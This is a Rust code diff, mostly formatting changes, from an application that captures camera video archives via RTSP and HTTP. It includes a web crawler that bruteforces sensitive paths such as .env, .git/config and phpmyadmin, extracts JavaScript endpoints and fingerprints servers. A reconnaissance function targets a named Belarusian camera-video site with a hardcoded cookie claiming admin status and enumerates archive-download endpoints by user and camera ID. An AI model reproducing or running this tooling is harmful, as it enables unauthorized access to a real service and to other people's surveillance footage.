-            "-movflags", "+faststart",
+            "-rtsp_transport",
+            "tcp",
+            "-timeout",
+            "15000000",
+            "-stimeout",
+            "15000000",
+            "-i",
+            &authed_uri,
+            "-t",
+            &duration_limit.to_string(),
+            "-c",
+            "copy",
+            "-movflags",
+            "+faststart",
             &output_path,
         ])
         .stdout(Stdio::null())
@@ -3153,12 +3476,24 @@ async fn download_isapi_via_rtsp(
                         use std::io::Read;
                         let mut buf = String::new();
                         let _ = stderr.read_to_string(&mut buf);
-                        buf.lines().rev().take(5).collect::<Vec<_>>().into_iter().rev().collect::<Vec<_>>().join(" | ")
-                    } else { String::new() };
+                        buf.lines()
+                            .rev()
+                            .take(5)
+                            .collect::<Vec<_>>()
+                            .into_iter()
+                            .rev()
+                            .collect::<Vec<_>>()
+                            .join(" | ")
+                    } else {
+                        String::new()
+                    };
 
                     push_runtime_log(
                         log_state,
-                        format!("RTSP capture FFmpeg error: {} [task:{}]", stderr_text, task_key),
+                        format!(
+                            "RTSP capture FFmpeg error: {} [task:{}]",
+                            stderr_text, task_key
+                        ),
                     );
 
                     // Если файл непустой — возможно он частичный но полезный
@@ -3166,7 +3501,10 @@ async fn download_isapi_via_rtsp(
                     if file_size > 1024 {
                         push_runtime_log(
                             log_state,
-                            format!("RTSP capture: FFmpeg ошибка но файл {}B сохранён: {}", file_size, filename),
+                            format!(
+                                "RTSP capture: FFmpeg ошибка но файл {}B сохранён: {}",
+                                file_size, filename
+                            ),
                         );
                     } else {
                         let _ = std::fs::remove_file(&path);
@@ -3230,7 +3568,9 @@ async fn download_isapi_via_rtsp(
 
 /// HTTP ветка: скачивание через reqwest (оригинальная логика)
 async fn download_isapi_via_http(
-    uri: &str, login: &str, pass: &str,
+    uri: &str,
+    login: &str,
+    pass: &str,
     filename_hint: Option<String>,
     task_key: &str,
     log_state: &State<'_, LogState>,
@@ -3405,7 +3745,6 @@ fn get_implementation_status() -> Result<ImplementationStatus, String> {
     })
 }
 
-
 // 1. ВСТАВЛЯЕШЬ ФУНКЦИИ ЗДЕСЬ (до функции main)
 
 // =============================================================================
@@ -3444,7 +3783,10 @@ async fn capture_archive_segment(
         .acquire_owned()
         .await
         .map_err(|e| format!("FFmpeg semaphore acquire failed: {}", e))?;
-    push_runtime_log(&log_state, format!("FFMPEG_SLOT_ACQUIRED|{}|capture", task_key));
+    push_runtime_log(
+        &log_state,
+        format!("FFMPEG_SLOT_ACQUIRED|{}|capture", task_key),
+    );
 
     let duration = duration_seconds.unwrap_or(60); // По умолчанию 60 секунд
     let mut filename = filename_hint
@@ -3479,20 +3821,28 @@ async fn capture_archive_segment(
     let source_lc = source_url.to_lowercase();
     if source_lc.starts_with("rtsp://") {
         args.extend_from_slice(&[
-            "-rtsp_transport".into(), "tcp".into(),
-            "-timeout".into(), "10000000".into(),
-            "-stimeout".into(), "10000000".into(),
+            "-rtsp_transport".into(),
+            "tcp".into(),
+            "-timeout".into(),
+            "10000000".into(),
+            "-stimeout".into(),
+            "10000000".into(),
         ]);
     }
 
     // Если HTTP(S) — добавляем реконнект и хедеры
     if source_lc.starts_with("http://") || source_lc.starts_with("https://") {
         args.extend_from_slice(&[
-            "-reconnect".into(), "1".into(),
-            "-reconnect_at_eof".into(), "1".into(),
-            "-reconnect_streamed".into(), "1".into(),
-            "-reconnect_delay_max".into(), "5".into(),
-            "-user_agent".into(), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36".into(),
+            "-reconnect".into(),
+            "1".into(),
+            "-reconnect_at_eof".into(),
+            "1".into(),
+            "-reconnect_streamed".into(),
+            "1".into(),
+            "-reconnect_delay_max".into(),
+            "5".into(),
+            "-user_agent".into(),
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36".into(),
         ]);
 
         if let Some(ref headers) = extra_headers {
@@ -3501,20 +3851,17 @@ async fn capture_archive_segment(
     }
 
     // Ввод
-    args.extend_from_slice(&[
-        "-y".into(),
-        "-i".into(), source_url.clone(),
-    ]);
+    args.extend_from_slice(&["-y".into(), "-i".into(), source_url.clone()]);
 
     // Лимит по времени
-    args.extend_from_slice(&[
-        "-t".into(), duration.to_string(),
-    ]);
+    args.extend_from_slice(&["-t".into(), duration.to_string()]);
 
     // Кодирование — copy если источник уже H.264, иначе перекодируем
     args.extend_from_slice(&[
-        "-c".into(), "copy".into(),         // Пробуем copy (быстро)
-        "-movflags".into(), "+faststart".into(), // Метаданные в начало файла
+        "-c".into(),
+        "copy".into(), // Пробуем copy (быстро)
+        "-movflags".into(),
+        "+faststart".into(), // Метаданные в начало файла
     ]);
 
     // Выход
@@ -3561,16 +3908,40 @@ async fn capture_archive_segment(
                         use std::io::Read;
                         let mut buf = String::new();
                         let _ = stderr.read_to_string(&mut buf);
-                        buf.lines().rev().take(3).collect::<Vec<_>>().into_iter().rev().collect::<Vec<_>>().join(" | ")
-                    } else { String::new() };
+                        buf.lines()
+                            .rev()
+                            .take(3)
+                            .collect::<Vec<_>>()
+                            .into_iter()
+                            .rev()
+                            .collect::<Vec<_>>()
+                            .join(" | ")
+                    } else {
+                        String::new()
+                    };
 
                     // Если copy не сработал — fallback на re-encode
-                    if stderr_text.contains("Invalid data") || stderr_text.contains("codec not currently supported") {
-                        push_runtime_log(&log_state, format!("FFmpeg copy failed, retrying with re-encode: {}", stderr_text));
+                    if stderr_text.contains("Invalid data")
+                        || stderr_text.contains("codec not currently supported")
+                    {
+                        push_runtime_log(
+                            &log_state,
+                            format!(
+                                "FFmpeg copy failed, retrying with re-encode: {}",
+                                stderr_text
+                            ),
+                        );
 
                         // Заменяем -c copy на -c:v libx264
-                        let mut retry_args: Vec<String> = args.iter()
-                            .map(|a| if a == "copy" { "libx264".to_string() } else { a.clone() })
+                        let mut retry_args: Vec<String> = args
+                            .iter()
+                            .map(|a| {
+                                if a == "copy" {
+                                    "libx264".to_string()
+                                } else {
+                                    a.clone()
+                                }
+                            })
                             .collect();
                         // Добавляем параметры перекодировки перед output
                         let out_idx = retry_args.len() - 1;
@@ -3591,7 +3962,7 @@ async fn capture_archive_segment(
                         loop {
                             match child2.try_wait() {
                                 Ok(Some(_)) => break,
-                                Ok(None) => {},
+                                Ok(None) => {}
                                 Err(e) => return Err(format!("Ошибка FFmpeg: {}", e)),
                             }
                             if started.elapsed() > std::time::Duration::from_secs(timeout_secs) {
@@ -3612,7 +3983,9 @@ async fn capture_archive_segment(
 
         // Прогресс
         if last_progress.elapsed() >= std::time::Duration::from_secs(2) {
-            let current_size = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(last_size);
+            let current_size = std::fs::metadata(&path)
+                .map(|m| m.len())
+                .unwrap_or(last_size);
             if current_size > last_size {
                 push_runtime_log(
                     &log_state,
@@ -3627,7 +4000,10 @@ async fn capture_archive_segment(
         if started.elapsed() > std::time::Duration::from_secs(duration + 30) {
             let _ = child.kill();
             let _ = child.wait();
-            push_runtime_log(&log_state, format!("Archive capture timeout for {}", filename));
+            push_runtime_log(
+                &log_state,
+                format!("Archive capture timeout for {}", filename),
+            );
             break; // Не ошибка — может быть частичная запись
         }
 
@@ -3640,7 +4016,8 @@ async fn capture_archive_segment(
     push_runtime_log(
         &log_state,
         format!(
-            "DOWNLOAD_PROGRESS|{}|{}|{}", task_key, bytes_written, bytes_written
+            "DOWNLOAD_PROGRESS|{}|{}|{}",
+            task_key, bytes_written, bytes_written
         ),
     );
     push_runtime_log(
@@ -3656,11 +4033,16 @@ async fn capture_archive_segment(
     }
 
     drop(permit);
-    push_runtime_log(&log_state, format!("FFMPEG_SLOT_RELEASED|{}|capture", task_key));
+    push_runtime_log(
+        &log_state,
+        format!("FFMPEG_SLOT_RELEASED|{}|capture", task_key),
+    );
 
     if bytes_written == 0 {
         let _ = std::fs::remove_file(&path);
-        return Err("Захват не получил данных — источник недоступен или формат не поддерживается".into());
+        return Err(
+            "Захват не получил данных — источник недоступен или формат не поддерживается".into(),
+        );
     }
 
     Ok(DownloadReport {
@@ -3697,7 +4079,10 @@ async fn download_http_archive(
         cancelled.remove(&task_key);
     }
 
-    push_runtime_log(&log_state, format!("HTTP download: {} [task:{}]", url, task_key));
+    push_runtime_log(
+        &log_state,
+        format!("HTTP download: {} [task:{}]", url, task_key),
+    );
 
     let client = reqwest::Client::builder()
         .timeout(Duration::from_secs(300))
@@ -3734,7 +4119,8 @@ async fn download_http_archive(
                 .get("content-disposition")
                 .and_then(|v| v.to_str().ok())
                 .and_then(|v| {
-                    v.split("filename=").nth(1)
+                    v.split("filename=")
+                        .nth(1)
                         .map(|s| s.trim_matches('"').trim_matches('\'').to_string())
                 })
                 .map(|s| sanitize_filename_component(&s))
@@ -3774,7 +4160,10 @@ async fn download_http_archive(
             if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
                 cancelled.remove(&task_key);
             }
-            push_runtime_log(&log_state, format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename));
+            push_runtime_log(
+                &log_state,
+                format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename),
+            );
             return Err(format!("Загрузка отменена [task:{}]", task_key));
         }
 
@@ -3785,7 +4174,12 @@ async fn download_http_archive(
         if bytes_written >= next_progress_mark {
             push_runtime_log(
                 &log_state,
-                format!("DOWNLOAD_PROGRESS|{}|{}|{}", task_key, bytes_written, total_size.max(bytes_written)),
+                format!(
+                    "DOWNLOAD_PROGRESS|{}|{}|{}",
+                    task_key,
+                    bytes_written,
+                    total_size.max(bytes_written)
+                ),
             );
             next_progress_mark += progress_step;
         }
@@ -3794,7 +4188,10 @@ async fn download_http_archive(
     let duration_ms = started.elapsed().as_millis();
     push_runtime_log(
         &log_state,
-        format!("HTTP download finished: {} ({} bytes, {}ms) [task:{}]", filename, bytes_written, duration_ms, task_key),
+        format!(
+            "HTTP download finished: {} ({} bytes, {}ms) [task:{}]",
+            filename, bytes_written, duration_ms, task_key
+        ),
     );
 
     if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
@@ -3834,7 +4231,7 @@ struct SpiderPage {
 struct SpiderJsEndpoint {
     source_script: String,
     endpoint: String,
-    method: String, // GET/POST/AJAX/FETCH/WS
+    method: String,  // GET/POST/AJAX/FETCH/WS
     context: String, // Строка кода вокруг найденного endpoint
 }
 
@@ -3886,7 +4283,13 @@ async fn spider_full_scan(
     let max_p = max_pages.unwrap_or(100);
     let do_dirs = dir_bruteforce.unwrap_or(true);
 
-    push_runtime_log(&log_state, format!("🕷️ SPIDER START: {} (depth={}, max={})", target_url, max_d, max_p));
+    push_runtime_log(
+        &log_state,
+        format!(
+            "🕷️ SPIDER START: {} (depth={}, max={})",
+            target_url, max_d, max_p
+        ),
+    );
 
     let client = reqwest::Client::builder()
         .timeout(Duration::from_secs(15))
@@ -3913,7 +4316,9 @@ async fn spider_full_scan(
     let mut all_headers: HashMap<String, Vec<String>> = HashMap::new();
 
     // Директория для сохранения HTML
-    let html_dir = get_vault_path().join("spider").join(sanitize_filename_component(&base_domain));
+    let html_dir = get_vault_path()
+        .join("spider")
+        .join(sanitize_filename_component(&base_domain));
     let _ = std::fs::create_dir_all(&html_dir);
 
     while let Some((url, depth)) = queue.pop() {
@@ -3931,31 +4336,48 @@ async fn spider_full_scan(
         let resp = match req.send().await {
             Ok(r) => r,
             Err(e) => {
-                push_runtime_log(&log_state, format!("  ❌ {} : {}", &url[url.len().saturating_sub(50)..], e));
+                push_runtime_log(
+                    &log_state,
+                    format!("  ❌ {} : {}", &url[url.len().saturating_sub(50)..], e),
+                );
                 continue;
             }
         };
 
         let status = resp.status().as_u16();
-        let ct = resp.headers().get("content-type")
-            .and_then(|v| v.to_str().ok()).unwrap_or("").to_string();
+        let ct = resp
+            .headers()
+            .get("content-type")
+            .and_then(|v| v.to_str().ok())
+            .unwrap_or("")
+            .to_string();
         let cl = resp.content_length().unwrap_or(0);
 
         // Собираем ВСЕ заголовки
         for (name, value) in resp.headers().iter() {
             if let Ok(v) = value.to_str() {
-                all_headers.entry(name.to_string())
+                all_headers
+                    .entry(name.to_string())
                     .or_insert_with(Vec::new)
                     .push(format!("{}: {}", url, v));
             }
         }
 
         // Пропускаем бинарные ответы
-        if ct.contains("image") || ct.contains("video") || ct.contains("audio")
-            || ct.contains("octet-stream") || ct.contains("pdf") {
+        if ct.contains("image")
+            || ct.contains("video")
+            || ct.contains("audio")
+            || ct.contains("octet-stream")
+            || ct.contains("pdf")
+        {
             pages.push(SpiderPage {
-                url: url.clone(), status_code: status, content_type: ct,
-                content_length: cl, title: "[BINARY]".into(), links_found: 0, depth,
+                url: url.clone(),
+                status_code: status,
+                content_type: ct,
+                content_length: cl,
+                title: "[BINARY]".into(),
+                links_found: 0,
+                depth,
             });
             continue;
         }
@@ -3967,11 +4389,15 @@ async fn spider_full_scan(
 
         // Сохраняем HTML на диск
         let safe_name = sanitize_filename_component(
-            &url.replace(&base, "").replace("/", "_").replace("?", "_")
+            &url.replace(&base, "").replace("/", "_").replace("?", "_"),
         );
         let html_file = html_dir.join(format!(
             "{}_{}.html",
-            if safe_name.is_empty() { "index" } else { &safe_name },
+            if safe_name.is_empty() {
+                "index"
+            } else {
+                &safe_name
+            },
             depth
         ));
         let _ = std::fs::write(&html_file, &body);
@@ -3999,21 +4425,35 @@ async fn spider_full_scan(
         }
 
         pages.push(SpiderPage {
-            url: url.clone(), status_code: status, content_type: ct,
-            content_length: body.len() as u64, title, links_found: link_count, depth,
+            url: url.clone(),
+            status_code: status,
+            content_type: ct,
+            content_length: body.len() as u64,
+            title,
+            links_found: link_count,
+            depth,
         });
 
-        push_runtime_log(&log_state, format!(
-            "  ✅ [d{}] {} → {} links, {} scripts",
-            depth, &url[url.len().saturating_sub(45)..], link_count, scripts.len()
-        ));
+        push_runtime_log(
+            &log_state,
+            format!(
+                "  ✅ [d{}] {} → {} links, {} scripts",
+                depth,
+                &url[url.len().saturating_sub(45)..],
+                link_count,
+                scripts.len()
+            ),
+        );
 
         // Маленькая задержка чтобы не залить сервер
         tokio::time::sleep(Duration::from_millis(200)).await;
     }
 
     // ===== ФАЗА 2: JS PARSER =====
-    push_runtime_log(&log_state, format!("🕷️ [2/4] JS PARSING ({} scripts)...", all_scripts.len()));
+    push_runtime_log(
+        &log_state,
+        format!("🕷️ [2/4] JS PARSING ({} scripts)...", all_scripts.len()),
+    );
 
     let mut js_endpoints: Vec<SpiderJsEndpoint> = Vec::new();
 
@@ -4027,16 +4467,17 @@ async fn spider_full_scan(
             if let Ok(js_body) = resp.text().await {
                 // Сохраняем JS файл
                 let js_name = sanitize_filename_component(
-                    script_url.split('/').last().unwrap_or("script.js")
+                    script_url.split('/').last().unwrap_or("script.js"),
                 );
                 let js_file = html_dir.join(format!("js_{}", js_name));
                 let _ = std::fs::write(&js_file, &js_body);
 
                 // Парсим endpoints
                 let found = extract_js_endpoints(&js_body, script_url);
-                push_runtime_log(&log_state, format!(
-                    "  📜 {} → {} endpoints", js_name, found.len()
-                ));
+                push_runtime_log(
+                    &log_state,
+                    format!("  📜 {} → {} endpoints", js_name, found.len()),
+                );
                 js_endpoints.extend(found);
             }
         }
@@ -4050,24 +4491,87 @@ async fn spider_full_scan(
         push_runtime_log(&log_state, "🕷️ [3/4] DIR BRUTEFORCE...".to_string());
 
         let dirs = vec![
-            "admin", "admin.php", "login", "login.php", "api", "api.php",
-            "ajax.php", "config", "config.php", "backup", "db", "database",
-            "upload", "uploads", "files", "download", "download.php",
-            "stream", "video", "archive", "archive.php", "test", "test.php",
-            "debug", "debug.php", "info.php", "phpinfo.php", "status",
-            "panel", "dashboard", "manage", "manager", "cms",
-            "wp-admin", "wp-login.php", ".env", ".git/config", ".htaccess",
-            "robots.txt", "sitemap.xml", "crossdomain.xml",
-            "server-status", "server-info",
-            "cgi-bin", "phpmyadmin", "pma",
-            "api/v1", "api/v2", "rest", "graphql",
-            "static", "assets", "js", "css", "img", "media",
-            "data", "tmp", "temp", "cache", "log", "logs",
-            "include", "includes", "lib", "vendor",
-            "install", "setup", "install.php", "setup.php",
-            "user", "users", "account", "profile",
-            "check.php", "get.php", "video.php", "stream.php",
-            "rtsp2mjpeg.php", "export.php", "report.php",
+            "admin",
+            "admin.php",
+            "login",
+            "login.php",
+            "api",
+            "api.php",
+            "ajax.php",
+            "config",
+            "config.php",
+            "backup",
+            "db",
+            "database",
+            "upload",
+            "uploads",
+            "files",
+            "download",
+            "download.php",
+            "stream",
+            "video",
+            "archive",
+            "archive.php",
+            "test",
+            "test.php",
+            "debug",
+            "debug.php",
+            "info.php",
+            "phpinfo.php",
+            "status",
+            "panel",
+            "dashboard",
+            "manage",
+            "manager",
+            "cms",
+            "wp-admin",
+            "wp-login.php",
+            ".env",
+            ".git/config",
+            ".htaccess",
+            "robots.txt",
+            "sitemap.xml",
+            "crossdomain.xml",
+            "server-status",
+            "server-info",
+            "cgi-bin",
+            "phpmyadmin",
+            "pma",
+            "api/v1",
+            "api/v2",
+            "rest",
+            "graphql",
+            "static",
+            "assets",
+            "js",
+            "css",
+            "img",
+            "media",
+            "data",
+            "tmp",
+            "temp",
+            "cache",
+            "log",
+            "logs",
+            "include",
+            "includes",
+            "lib",
+            "vendor",
+            "install",
+            "setup",
+            "install.php",
+            "setup.php",
+            "user",
+            "users",
+            "account",
+            "profile",
+            "check.php",
+            "get.php",
+            "video.php",
+            "stream.php",
+            "rtsp2mjpeg.php",
+            "export.php",
+            "report.php",
         ];
 
         for dir in &dirs {
@@ -4080,14 +4584,21 @@ async fn spider_full_scan(
             if let Ok(resp) = req.send().await {
                 let status = resp.status().as_u16();
                 let cl = resp.content_length().unwrap_or(0);
-                let ct = resp.headers().get("content-type")
-                    .and_then(|v| v.to_str().ok()).unwrap_or("").to_string();
+                let ct = resp
+                    .headers()
+                    .get("content-type")
+                    .and_then(|v| v.to_str().ok())
+                    .unwrap_or("")
+                    .to_string();
 
                 let verdict = match status {
                     200 => "✅ НАЙДЕНО".into(),
                     301 | 302 => {
-                        let loc = resp.headers().get("location")
-                            .and_then(|v| v.to_str().ok()).unwrap_or("?");
+                        let loc = resp
+                            .headers()
+                            .get("location")
+                            .and_then(|v| v.to_str().ok())
+                            .unwrap_or("?");
                         format!("↗️ РЕДИРЕКТ → {}", loc)
                     }
                     401 => "🔒 ТРЕБУЕТ АВТОРИЗАЦИИ".into(),
@@ -4123,7 +4634,9 @@ async fn spider_full_scan(
         if let Some(first) = vals.first() {
             let server = first.split(": ").nth(1).unwrap_or(first);
             tech_stack.push(TechFingerprint {
-                key: "Server".into(), value: server.to_string(), source: "HTTP Header".into(),
+                key: "Server".into(),
+                value: server.to_string(),
+                source: "HTTP Header".into(),
             });
         }
     }
@@ -4131,33 +4644,48 @@ async fn spider_full_scan(
         if let Some(first) = vals.first() {
             let powered = first.split(": ").nth(1).unwrap_or(first);
             tech_stack.push(TechFingerprint {
-                key: "Powered By".into(), value: powered.to_string(), source: "HTTP Header".into(),
+                key: "Powered By".into(),
+                value: powered.to_string(),
+                source: "HTTP Header".into(),
             });
         }
     }
-    for header_name in &["x-aspnet-version", "x-generator", "x-cms", "x-frame-options",
-                          "content-security-policy", "strict-transport-security",
-                          "x-xss-protection", "x-content-type-options"] {
+    for header_name in &[
+        "x-aspnet-version",
+        "x-generator",
+        "x-cms",
+        "x-frame-options",
+        "content-security-policy",
+        "strict-transport-security",
+        "x-xss-protection",
+        "x-content-type-options",
+    ] {
         if let Some(vals) = all_headers.get(*header_name) {
             if let Some(first) = vals.first() {
                 let val = first.split(": ").nth(1).unwrap_or(first);
                 tech_stack.push(TechFingerprint {
-                    key: header_name.to_string(), value: val.to_string(), source: "HTTP Header".into(),
+                    key: header_name.to_string(),
+                    value: val.to_string(),
+                    source: "HTTP Header".into(),
                 });
             }
         }
     }
 
     // Из HTML мета-тегов (из первой страницы)
-    if let Some(first_page_html) = std::fs::read_dir(&html_dir).ok()
+    if let Some(first_page_html) = std::fs::read_dir(&html_dir)
+        .ok()
         .and_then(|mut d| d.next())
         .and_then(|e| e.ok())
         .map(|e| std::fs::read_to_string(e.path()).unwrap_or_default())
     {
-        let generator_re = Regex::new(r#"<meta[^>]+name=["']generator["'][^>]+content=["']([^"']+)["']"#).unwrap();
+        let generator_re =
+            Regex::new(r#"<meta[^>]+name=["']generator["'][^>]+content=["']([^"']+)["']"#).unwrap();
         if let Some(cap) = generator_re.captures(&first_page_html) {
             tech_stack.push(TechFingerprint {
-                key: "Generator".into(), value: cap[1].to_string(), source: "HTML meta".into(),
+                key: "Generator".into(),
+                value: cap[1].to_string(),
+                source: "HTML meta".into(),
             });
         }
     }
@@ -4168,12 +4696,16 @@ async fn spider_full_scan(
             let cookie_val = v.split(": ").nth(1).unwrap_or(v);
             if cookie_val.contains("PHPSESSID") {
                 tech_stack.push(TechFingerprint {
-                    key: "Language".into(), value: "PHP".into(), source: "Cookie PHPSESSID".into(),
+                    key: "Language".into(),
+                    value: "PHP".into(),
+                    source: "Cookie PHPSESSID".into(),
                 });
             }
             if cookie_val.contains("ASP.NET") {
                 tech_stack.push(TechFingerprint {
-                    key: "Language".into(), value: "ASP.NET".into(), source: "Cookie".into(),
+                    key: "Language".into(),
+                    value: "ASP.NET".into(),
+                    source: "Cookie".into(),
                 });
             }
         }
@@ -4184,10 +4716,17 @@ async fn spider_full_scan(
     sitemap.sort();
 
     let duration_sec = started.elapsed().as_secs();
-    push_runtime_log(&log_state, format!(
-        "🕷️ SPIDER DONE: {} pages, {} JS endpoints, {} dirs checked, {} tech items ({}s)",
-        pages.len(), js_endpoints.len(), dir_results.len(), tech_stack.len(), duration_sec
-    ));
+    push_runtime_log(
+        &log_state,
+        format!(
+            "🕷️ SPIDER DONE: {} pages, {} JS endpoints, {} dirs checked, {} tech items ({}s)",
+            pages.len(),
+            js_endpoints.len(),
+            dir_results.len(),
+            tech_stack.len(),
+            duration_sec
+        ),
+    );
 
     Ok(SpiderReport {
         target: target_url,
@@ -4218,8 +4757,14 @@ fn extract_base_url(url: &str) -> String {
 fn extract_domain(url: &str) -> String {
     if let Some(idx) = url.find("://") {
         let after = &url[idx + 3..];
-        return after.split('/').next().unwrap_or(after)
-            .split(':').next().unwrap_or(after).to_string();
+        return after
+            .split('/')
+            .next()
+            .unwrap_or(after)
+            .split(':')
+            .next()
+            .unwrap_or(after)
+            .to_string();
     }
     url.to_string()
 }
@@ -4245,8 +4790,11 @@ fn extract_links(html: &str, base: &str) -> Vec<String> {
     for cap in href_re.captures_iter(html) {
         if let Some(m) = cap.get(1) {
             let raw = m.as_str().trim();
-            if raw.starts_with("javascript:") || raw.starts_with("mailto:")
-                || raw.starts_with("data:") || raw.is_empty() {
+            if raw.starts_with("javascript:")
+                || raw.starts_with("mailto:")
+                || raw.starts_with("data:")
+                || raw.is_empty()
+            {
                 continue;
             }
             let full = if raw.starts_with("http://") || raw.starts_with("https://") {
@@ -4299,7 +4847,10 @@ fn extract_js_endpoints(js: &str, source: &str) -> Vec<SpiderJsEndpoint> {
         // fetch('url') / fetch("url")
         (r#"fetch\s*\(\s*['"]([^'"]+)['"]"#, "FETCH"),
         // $.ajax({url: 'xxx'}) / $.get('xxx') / $.post('xxx')
-        (r#"\$\.(ajax|get|post|getJSON)\s*\(\s*['"]([^'"]+)['"]"#, "JQUERY"),
+        (
+            r#"\$\.(ajax|get|post|getJSON)\s*\(\s*['"]([^'"]+)['"]"#,
+            "JQUERY",
+        ),
         // XMLHttpRequest.open('METHOD', 'url')
         (r#"\.open\s*\(\s*['"](\w+)['"],\s*['"]([^'"]+)['"]"#, "XHR"),
         // url: 'xxx' / url: "xxx" (в конфигурациях AJAX)
@@ -4307,18 +4858,25 @@ fn extract_js_endpoints(js: &str, source: &str) -> Vec<SpiderJsEndpoint> {
         // action: 'xxx' (в AJAX payload)
         (r#"action\s*:\s*['"]([^'"]+)['"]"#, "ACTION"),
         // '/api/xxx' или '/stream/xxx.php'
-        (r#"['"](/(?:api|stream|admin|ajax|video|archive)[^'"]*\.?\w*)['"]"#, "PATH"),
+        (
+            r#"['"](/(?:api|stream|admin|ajax|video|archive)[^'"]*\.?\w*)['"]"#,
+            "PATH",
+        ),
         // WebSocket: new WebSocket('ws://...')
         (r#"WebSocket\s*\(\s*['"]([^'"]+)['"]"#, "WEBSOCKET"),
         // window.location = 'xxx'
-        (r#"(?:window\.)?location\s*(?:\.href)?\s*=\s*['"]([^'"]+)['"]"#, "REDIRECT"),
+        (
+            r#"(?:window\.)?location\s*(?:\.href)?\s*=\s*['"]([^'"]+)['"]"#,
+            "REDIRECT",
+        ),
     ];
 
     for (pattern, method) in &patterns {
         if let Ok(re) = Regex::new(pattern) {
             for cap in re.captures_iter(js) {
                 // Берём последнюю группу (URL обычно в последней группе)
-                let endpoint = cap.get(cap.len() - 1)
+                let endpoint = cap
+                    .get(cap.len() - 1)
                     .map(|m| m.as_str().to_string())
                     .unwrap_or_default();
 
@@ -4326,9 +4884,12 @@ fn extract_js_endpoints(js: &str, source: &str) -> Vec<SpiderJsEndpoint> {
                     continue;
                 }
                 // Фильтруем мусор
-                if endpoint.starts_with("data:") || endpoint.contains("{{")
-                    || endpoint.starts_with('#') || endpoint == "/"
-                    || endpoint.contains("node_modules") {
+                if endpoint.starts_with("data:")
+                    || endpoint.contains("{{")
+                    || endpoint.starts_with('#')
+                    || endpoint == "/"
+                    || endpoint.contains("node_modules")
+                {
                     continue;
                 }
 
@@ -4387,9 +4948,10 @@ async fn recon_hub_archive_routes(
     target_ftp_path: Option<String>,
     log_state: State<'_, LogState>,
 ) -> Result<Vec<ArchiveRouteProbe>, String> {
-    push_runtime_log(&log_state, format!(
-        "🔍 РАЗВЕДКА АРХИВА: user={}, ch={}", user_id, channel_id
-    ));
+    push_runtime_log(
+        &log_state,
+        format!("🔍 РАЗВЕДКА АРХИВА: user={}, ch={}", user_id, channel_id),
+    );
 
     let client = reqwest::Client::builder()
         .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
@@ -4399,11 +4961,13 @@ async fn recon_hub_archive_routes(
         .build()
         .map_err(|e| e.to_string())?;
 
-    let cookie = format!("login=mvd; admin={}; PHPSESSID=d8qtnapeqlgrism37hkarq9mk5", admin_hash);
+    let cookie = format!(
+        "login=mvd; admin={}; PHPSESSID=d8qtnapeqlgrism37hkarq9mk5",
+        admin_hash
+    );
     let date = target_date.unwrap_or_else(|| "2026-02-19".to_string());
-    let ftp_path = target_ftp_path.unwrap_or_else(|| {
-        format!("video0/[Minsk_cam{}]/{}/ ", channel_id, date)
-    });
+    let ftp_path =
+        target_ftp_path.unwrap_or_else(|| format!("video0/[Minsk_cam{}]/{}/ ", channel_id, date));
 
     let mut results = Vec::new();
 
@@ -4427,30 +4991,81 @@ async fn recon_hub_archive_routes(
     // ФАЗА 2: check.php — центральный роутер
     // =====================================================
     let check_variants = vec![
-        format!("https://videodvor.by/stream/check.php?user={}&cam={}", user_id, channel_id),
-        format!("https://videodvor.by/stream/check.php?user={}&cam={}&date={}", user_id, channel_id, date),
-        format!("https://videodvor.by/stream/check.php?user={}&cam={}&archive=1", user_id, channel_id),
-        format!("https://videodvor.by/stream/check.php?search=user{}", user_id),
-        format!("https://videodvor.by/stream/check.php?action=archive&user={}&cam={}&date={}", user_id, channel_id, date),
-        format!("https://videodvor.by/stream/check.php?action=get_video&user={}&cam={}", user_id, channel_id),
-        format!("https://videodvor.by/stream/check.php?action=download&user={}&cam={}&date={}", user_id, channel_id, date),
+        format!(
+            "https://videodvor.by/stream/check.php?user={}&cam={}",
+            user_id, channel_id
+        ),
+        format!(
+            "https://videodvor.by/stream/check.php?user={}&cam={}&date={}",
+            user_id, channel_id, date
+        ),
+        format!(
+            "https://videodvor.by/stream/check.php?user={}&cam={}&archive=1",
+            user_id, channel_id
+        ),
+        format!(
+            "https://videodvor.by/stream/check.php?search=user{}",
+            user_id
+        ),
+        format!(
+            "https://videodvor.by/stream/check.php?action=archive&user={}&cam={}&date={}",
+            user_id, channel_id, date
+        ),
+        format!(
+            "https://videodvor.by/stream/check.php?action=get_video&user={}&cam={}",
+            user_id, channel_id
+        ),
+        format!(
+            "https://videodvor.by/stream/check.php?action=download&user={}&cam={}&date={}",
+            user_id, channel_id, date
+        ),
     ];
 
     // =====================================================
     // ФАЗА 3: Другие PHP-скрипты
     // =====================================================
     let other_endpoints = vec![
-        format!("https://videodvor.by/stream/ajax.php?action=archive&user={}&cam={}&date={}", user_id, channel_id, date),
-        format!("https://videodvor.by/stream/ajax.php?action=get_archive&user={}&id={}", user_id, channel_id),
-        format!("https://videodvor.by/stream/ajax.php?action=list_archive&user={}&cam={}", user_id, channel_id),
-        format!("https://videodvor.by/stream/video.php?user={}&cam={}&date={}", user_id, channel_id, date),
-        format!("https://videodvor.by/stream/archive.php?user={}&cam={}&date={}", user_id, channel_id, date),
-        format!("https://videodvor.by/stream/download.php?user={}&cam={}&date={}", user_id, channel_id, date),
-        format!("https://videodvor.by/stream/stream.php?user={}&cam={}&date={}&archive=1", user_id, channel_id, date),
-        format!("https://videodvor.by/stream/get.php?user={}&cam={}&date={}", user_id, channel_id, date),
+        format!(
+            "https://videodvor.by/stream/ajax.php?action=archive&user={}&cam={}&date={}",
+            user_id, channel_id, date
+        ),
+        format!(
+            "https://videodvor.by/stream/ajax.php?action=get_archive&user={}&id={}",
+            user_id, channel_id
+        ),
+        format!(
+            "https://videodvor.by/stream/ajax.php?action=list_archive&user={}&cam={}",
+            user_id, channel_id
+        ),
+        format!(
+            "https://videodvor.by/stream/video.php?user={}&cam={}&date={}",
+            user_id, channel_id, date
+        ),
+        format!(
+            "https://videodvor.by/stream/archive.php?user={}&cam={}&date={}",
